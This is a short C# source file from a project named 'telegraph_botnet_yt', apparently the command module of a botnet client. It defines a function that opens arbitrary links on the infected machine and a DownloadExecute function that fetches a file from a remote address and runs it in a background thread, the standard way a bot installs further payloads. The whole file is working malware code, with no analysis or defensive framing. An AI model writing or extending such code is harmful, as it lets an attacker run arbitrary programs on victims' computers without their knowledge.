using System.Diagnostics;
using System.Threading;

namespace telegraph_botnet_yt
{
    class functions
    {
        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }

        public static void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URI);
                Process.Start(file_path);
            });
            thr.Start();
        }
    }
}
